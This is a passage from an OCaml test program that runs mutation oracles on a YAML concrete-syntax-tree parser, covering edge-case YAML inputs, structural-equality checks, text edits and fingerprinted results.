    match Yaml_cst.apply_edits (parsed source) edits with
    | Ok value -> Json.Object [ ("ok", Json.String value) ]
    | Error message -> Json.Object [ ("error", Json.String message) ]
  in
  let manual_scalar =
    Yaml_cst.Scalar
      {
        value = "manual";
        raw = "manual";
        style = Yaml_cst.Plain;
        anchor = Some "inner";
        tag = Some "!";
        span = Span.none;
      }
  in
  let manual_decorated =
    Yaml_cst.Decorated
      { value = manual_scalar; anchor = None; tag = None; span = Span.none }
  in
  let manual_tree root =
    {
      Yaml_cst.file = "manual.yml";
      source = "";
      bom = false;
      newline = `None;
      documents = [ { root = Some root; directives = []; span = Span.none } ];
      trivia = [];
      anchors = [];
      problems = [];
    }
  in
  Json.Object
    [
      ("path", path_value);
      ( "anchor",
        Option.fold ~none:Json.Null ~some:Yaml_cst.node_to_json
          (Yaml_cst.resolve_alias anchor_tree "x") );
      ( "equal-identical",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "a: one\n")) );
      ( "different-value",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "a: two\n")) );
      ( "different-key",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "a: one\n") (parsed "b: one\n")) );
      ( "different-kind",
        Json.Bool (Yaml_cst.structural_equal (parsed "a\n") (parsed "- a\n")) );
      ( "different-scalar-style",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "value\n") (parsed "'value'\n"))
      );
      ( "different-scalar-anchor",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "&left value\n")
             (parsed "&right value\n")) );
      ( "different-scalar-tag",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "!left value\n")
             (parsed "!right value\n")) );
      ( "invalid-reason",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "raw" "left")
             (invalid_tree "raw" "right")) );
      ( "invalid-identical",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "raw" "reason")
             (invalid_tree "raw" "reason")) );
      ( "invalid-raw",
        Json.Bool
          (Yaml_cst.structural_equal
             (invalid_tree "left" "reason")
             (invalid_tree "right" "reason")) );
      ( "decorated-anchor",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "&left\nvalue\n")
             (parsed "&right\nvalue\n")) );
      ( "decorated-tag",
        Json.Bool
          (Yaml_cst.structural_equal (parsed "!left\nvalue\n")
             (parsed "!right\nvalue\n")) );
      ( "decorated-mapping-size",
        Json.Int (collection_size Yaml_cst.as_mapping "&root\nkey: value\n") );
      ( "decorated-sequence-size",
        Json.Int (collection_size Yaml_cst.as_sequence "&root\n- one\n- two\n")
      );
      ( "edits",
        Json.Array
          [
            edit "abc"
              [ { Yaml_cst.start_byte = 0; stop_byte = 0; replacement = "x" } ];
            edit "abc"
              [ { Yaml_cst.start_byte = 0; stop_byte = 1; replacement = "x" } ];
            edit "abc"
              [ { Yaml_cst.start_byte = 3; stop_byte = 3; replacement = "x" } ];
            edit "abc"
              [ { Yaml_cst.start_byte = -1; stop_byte = 0; replacement = "x" } ];
            edit "abc"
              [
                { Yaml_cst.start_byte = 0; stop_byte = 1; replacement = "x" };
                { Yaml_cst.start_byte = 1; stop_byte = 2; replacement = "y" };
              ];
          ] );
      ( "manual-events",
        Json.Array
          [
            Json.String
              (Yaml_event.of_cst (invalid_tree "invalid" "reason")
              |> Yaml_event.to_string);
            Json.String
              (Yaml_event.of_cst (manual_tree manual_decorated)
              |> Yaml_event.to_string);
            Json.String
              (Yaml_event.to_line
                 (Yaml_event.Scalar
                    {
                      value = "\012";
                      style = Yaml_cst.Double_quoted;
                      anchor = None;
                      tag = None;
                    }));
          ] );
    ]

let yaml_edge_oracle () =
  let sources =
    [
      ("crlf", "root:\r\n  child: value\r\n");
      ("bom-only", "\239\187\191");
      ("partial-bom-first", "\239ab: value\n");
      ("partial-bom-second", "a\187c: value\n");
      ("partial-bom-indicator", "\239XY---\nvalue\n");
      ("escaped-mapping-key", "\"a\\\\\\\"b\": value\n");
      ("empty-quoted-key", "\"\": value\n");
      ("unicode-boundary", "value: \"\\u07FF\"\n");
      ("empty-folded", "value: >+\n  \n  \n");
      ("empty-literal-header-eof", "value: |");
      ("empty-folded-header-eof", "value: >");
      ("unterminated-quote", "value: \"\n  continued\n");
      ("flow-spans", "root: [&x value, *x]\n");
      ("blank-block", "value: |+\n  \n  \n");
      ("alias-colon", "&x value\n*x:\n");
      ("alias-colon-only", "*x:\n");
      ("sequence-indent", "root:\n  - item\n");
      ("explicit-empty", "? key\n:\n");
      ("explicit-colon-only", ":\n");
      ("explicit-no-value", "? key\n");
      ("explicit-followed-implicit", "? key\nnext: value\n");
      ("merge-key", "base: &base {a: b}\nmerged:\n  <<: *base\n");
      ("empty-at-eof", "key:\n");
      ("empty-at-eof-no-newline", "key:");
      ("empty-quoted", "value: \"\"\n");
      ("bom-document", "\239\187\191---\nkey: value\n");
      ( "document-boundaries",
        "# lead\n%YAML 1.2\n---\na: b\n...\n# between\n---\nc: d\n" );
      ("vertical-tab", "value: \"\\v\"\n");
      ("invalid-percent-tag", "%TAG !e! tag:%GG:\n---\nvalue: !e!thing data\n");
      ("escaped-quotes", "value: \"escaped \\\\\\\" # still value\"\n");
      ("escaped-space-comment", "value: \"escaped\\ \" # comment\n");
      ("escaped-hash-comment", "value: \"escaped \\\"# value\" # comment\n");
      ("single-doubled", "value: 'it''s: fine' # comment\n");
      ("single-doubled-hash", "value: 'it''s # value' # comment\n");
      ("property-quoted", "value: &a 'x:y'\n");
      ("property-tabs", "value:\t&anchor\t!tag\tplain\n");
      ("property-quoted-colon-key", "&anchor   \"a:b\": value\n");
      ("property-quoted-separated-colon-key", "&anchor   \"a: b\": value\n");
      ("bad-block-suffix", "value: |x\n  data\n");
      ("same-indent-block-end", "value: |\nnext: value\n");
      ("zero-version", "%YAML 0.1\n---\nvalue\n");
      ("flow-escape", "value: [\"a\\\\\\\"b\", c]\n");
      ("block-comment-indent", "value: |\n# same indent\nnext: value\n");
      ("block-leading-space", "value: |\n   \n  content\n");
      ("decorated-block-mapping", "&root\nkey: value\n");
      ("decorated-block-sequence", "!seq\n- one\n- two\n");
      ("decorated-flow-mapping", "&root {key: value}\n");
      ("flow-close-comment", "root: [a] # trailing\n");
      ("partial-bom-tail", "\239\187X--- value\n");
      ("partial-bom-middle", "\239X\191--- value\n");
      ("bom-inline-document", "\239\187\191--- key: value\n");
      ("property-spacing", "value: &anchor   !tag   plain\n");
      ("flow-single-quotes", "root: {'a,b': 'c:d', '': ''}\n");
      ("flow-double-quotes", "root: {\"a,b\": \"c:d\", \"\": \"\"}\n");
      ("flow-escaped-double-key", "root: {\"a\\\"b\": value}\n");
      ("escape-ascii-boundary", "value: \"\\u007F\"\n");
      ( "escape-simple-boundaries",
        "value: \"\\0\\a\\b\\t\\n\\v\\f\\r\\e\\ \\\"\\/\\\\\"\n" );
      ("escape-unicode-boundaries", "value: \"\\L\\P\\xAF\\uFFFF\\U00010000\"\n");
      ("escape-uppercase-hex", "value: \"\\xAf\\uAbCd\"\n");
      ("escape-trailing-slash", "value: \"trailing\\\"\n");
      ("escape-space-only", "value: \"\\ \"\n");
      ("escape-backslash-only", "value: \"\\\\\"\n");
      ("empty-single-quoted", "value: ''\n");
      ("multiline-single-quoted", "value: 'one\n  two'\n");
      ("multiline-double-quoted", "value: \"one\n  two\"\n");
      ("multiline-flow-single-quoted", "root: ['one\n  two', three]\n");
      ("multiline-flow-double-escaped", "root: [\"one\\\n  two\", three]\n");
      ( "multiline-flow-single-bracket",
        "root: ['contains ] and }\n  continued', tail]\n" );
      ( "multiline-flow-double-bracket",
        "root: [\"contains ] and }\n  continued\", tail]\n" );
      ("plain-multiline", "value: first\n  second\n");
      ("plain-multiline-blank", "value: first\n\n  second\n");
      ("plain-not-continued", "value: first\nnext: second\n");
      ("folded-one-blank", "value: >\n  first\n\n  second\n");
      ("folded-trailing-blank", "value: >+\n  first\n  \n");
      ("folded-leading-blank", "value: >\n\n  first\n");
      ("folded-more-indented", "value: >\n   first\n  second\n");
      ("folded-tabs", "value: >\n  first\t\t\n  second\n");
      ("literal-explicit-indent", "value: |2\n  first\n  \n  second\n");
      ("literal-short-first-indent", "value: |3\n  first\n   second\n");
      ("literal-blank-required", "value: |2\n  \n  value\n");
      ("literal-blank-over-required", "value: |2\n   \n  value\n");
      ("literal-blank-at-required", "value: |2\n  \n");
      ("literal-blank-past-required", "value: |2\n   \n");
      ("literal-tab-at-required", "value: |2\n  \t\n");
      ("literal-space-tab-past-required", "value: |2\n   \t\n  value\n");
      ("literal-inferred-space-tab", "value: |\n   \t\n  value\n");
      ("literal-first-under-explicit", "value: |4\n   first\nnext: value\n");
      ("literal-empty-required-width", "value: |3\n   \n   value\n");
      ("property-only-eof", "&anchor\n");
      ("alias-key-in-sequence", "base: &x value\nitems:\n  - *x:\n");
      ("explicit-sequence-value", "? key\n: - one\n  - two\n");
      ("explicit-nested-empty-value", "? key\n:\n  nested: value\n");
      ("explicit-nested-sequence", "? key\n:\n  - one\n  - two\n");
      ("explicit-empty-before-implicit", "? key\n:\nnext: value\n");
      ( "sequence-explicit-entry",
        "items:\n  - ? key\n    : value\n  - ? other\n    : - one\n      - two\n" );
      ( "sequence-explicit-followed-implicit",
        "items:\n  - ? key\n    next: value\n" );
      ( "sequence-explicit-wrong-colon-indent",
        "items:\n  - ? key\n  : value\n" );
      ("explicit-colon-nested-value", ":\n  nested: value\n");
      ("document-end-at-eof", "---\nvalue\n...\n");
      ("empty-explicit-document", "---\n...\n");
      ("event-form-feed", "value: \"\\f\"\n");
      ("verbatim-empty-tag", "value: !<> data\n");
      ("verbatim-percent-tag", "value: !<tag:example,%AF> data\n");
      ( "tag-handle-percent",
        "%TAG !e! tag:example.com,2000:%AF/\n---\nvalue: !e!foo%aF data\n" );
      ( "overlapping-tag-handles",
        "%TAG ! tag:short:/\n%TAG !e! tag:long:/\n---\nvalue: !e!item data\n" );
      ( "overlapping-tag-handles-reversed",
        "%TAG !e! tag:long:/\n%TAG ! tag:short:/\n---\nvalue: !e!item data\n" );
      ( "directive-inline-comment",
        "%YAML 1.2 # version\n%TAG !e! tag:example:/ # handle\n---\nvalue: !e!item data\n" );
      ("invalid-short-hex", "value: \"\\x0\"\n");
      ("invalid-hex-digit", "value: \"\\x0G\"\n");
      ("invalid-unicode-digit", "value: \"\\u000G\"\n");
      ("invalid-long-unicode-digit", "value: \"\\U0000000G\"\n");
      ("invalid-double-chomp", "value: |++\n  data\n");
      ("invalid-double-indent", "value: |22\n  data\n");
      ("valid-indent-then-chomp", "value: |2+\n  data\n");
      ("valid-chomp-then-indent", "value: |+2\n  data\n");
      ("single-contains-invalid-double-escape", "value: 'text \"bad\\q\" text'\n");
      ("single-contains-flow-like-invalid-escape", "value: '[\"bad\\q\"]'\n");
      ("single-before-invalid-double-escape", "root: ['single', \"bad\\q\"]\n");
      ("flow-doubled-single", "root: ['a''b', c]\n");
      ("flow-compact-single-map", "root: {'a:b':'c:d','e':'f'}\n");
      ("flow-escaped-double-hash", "root: [\"a\\\"#b\", c]\n");
      ("flow-single-delimiters", "root: ['[},:#', tail]\n");
      ("flow-double-delimiters", "root: [\"[},:#\", tail]\n");
      ("flow-mismatched-close", "root: [{a: b]\n");
      ("flow-unmatched-close", "root: [a, }]\n");
      ("flow-comment-no-separation", "root: [a]#comment\n");
      ("flow-comment-after-comma", "root: [a,#comment\n  b]\n");
      ("flow-comment-after-comma-syntax", "root: [a,# ]},[,\n  b]\n");
      ("flow-comment-interrupted", "root: [a #comment\n  , b]\n");
      ("flow-comment-interrupted-syntax", "root: [a # ]},[,\n  , b]\n");
      ("quoted-flow-tail", "root: {key: \"value\"tail}\n");
      ("quoted-comment-no-separation", "key: \"value\"#comment\n");
      ("quoted-comment-separated", "key: \"value\" #comment\n");
      ("quoted-mapping-continuation", "key: \"one\nzero\"\n");
      ("tab-block-mapping", "\tkey: value\n");
      ("tab-nested-node", "-\tkey: value\n");
      ("tab-only-nested-indicator", "- \t\n");
      ("block-leading-tab", "value: |\n\t\n  content\n");
      ("block-comment-reference", "value: |\n   \n    # comment\n  content\n");
    ]
  in
  Json.Object
    [
      ("trees", Json.Array (List.map yaml_tree_evidence sources));
      ("structural", yaml_structural_evidence ());
      ( "manual_vertical_tab",
        Json.String
          (Yaml_event.to_line
             (Yaml_event.Scalar
                {
                  value = "\011";
                  style = Yaml_cst.Double_quoted;
                  anchor = None;
                  tag = None;
                })) );
    ]
  |> fingerprint "yaml-edges"
       "8334b793b95c69b326eec137cccb2dc8a03b15c3878132159dc6f46b0cfcb866"

let rec yaml_suite_inputs root relative =
  let directory =
    if relative = "" then root else Filename.concat root relative
  in
  Sys.readdir directory |> Array.to_list |> List.sort String.compare
  |> List.concat_map (fun name ->
      let child_relative =
        if relative = "" then name else Filename.concat relative name
      in
      let child = Filename.concat root child_relative in
      if Sys.is_directory child then yaml_suite_inputs root child_relative
      else if name = "in.yaml" then
        [
          ( Util.normalize_slashes child_relative,
            In_channel.with_open_bin child In_channel.input_all );
        ]
      else [])

let yaml_suite_oracle () =
  match Sys.getenv_opt "WORKFLOW_VERIFIER_YAML_SUITE" with
  | None -> Printf.printf "mutation oracle yaml-suite-layout: skipped\n%!"
  | Some root when String.trim root = "" ->
      Printf.printf "mutation oracle yaml-suite-layout: skipped\n%!"
  | Some root ->
      let inputs = yaml_suite_inputs root "" in
      if List.length inputs <> 402 then
        record_failure "yaml suite census expected 402 inputs, found %d"
          (List.length inputs)
      else
        inputs |> List.map yaml_tree_evidence |> fun trees ->
        Json.Array trees
        |> fingerprint "yaml-suite-layout"
             "3c2625d8c7b163c9f1f599eadb611cc77ba43cca1e9690c22ed9758cc0cf658c"

let () =
  Printexc.record_backtrace true;
  (try script_oracle ()
   with error ->
     record_failure "script oracle raised: %s" (Printexc.to_string error));
  (try script_edge_oracle ()
   with error ->
     record_failure "script edge oracle raised: %s" (Printexc.to_string error));
  (try config_oracle ()
   with error ->
     record_failure "config oracle raised: %s" (Printexc.to_string error));
  (try semantic_oracle ()
   with error ->
     record_failure "semantic oracle raised: %s" (Printexc.to_string error));
  (try semantic_edge_oracle ()
   with error ->
     record_failure "semantic edge oracle raised: %s" (Printexc.to_string error));
  (try config_edge_oracle ()
   with error ->
     record_failure "config edge oracle raised: %s" (Printexc.to_string error));
  (try yaml_edge_oracle ()
   with error ->
     record_failure "YAML edge oracle raised: %s" (Printexc.to_string error));
  (try yaml_suite_oracle ()
   with error ->
     record_failure "YAML suite oracle raised: %s" (Printexc.to_string error));
  match List.rev !failures with
  | [] -> Printf.printf "mutation semantic oracles passed\n%!"
  | messages ->
      List.iter
        (fun message -> Printf.eprintf "not ok - %s\n%!" message)
        messages;
      exit 1
